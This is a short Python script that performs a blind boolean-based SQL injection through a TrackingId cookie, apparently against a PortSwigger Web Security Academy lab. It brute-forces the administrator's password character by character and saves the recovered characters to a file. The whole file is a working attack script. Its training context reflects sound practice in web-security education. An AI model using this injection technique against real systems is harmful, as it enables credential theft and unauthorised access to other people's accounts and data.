from requests import get

base_url = 'https://0ab000ba03b908f981d50c75007200a7.web-security-academy.net'
base_url_filter = f'{base_url}/filter?category=Corporate+gifts'

password_chars = [chr(i) for i in range(97, 123)] + [str(i) for i in range(10)]

for i in range(1,21):
    for char in password_chars:
        headers = {
            "Cookie": f"TrackingId=fjJBOAOlql0W3MwS' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{char}; session=pY4KuDv8VtX62ftaFzSzfe80gfF4DHDM",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
        }

        response = get(base_url_filter, headers=headers)
        print(f'{i}: {char}')
        if "Welcome" in response.text:
            print(f"\033[92m{i} {char} achou\033[0m")
            with open('senha.txt', '+a') as f:
                f.write(char)
            break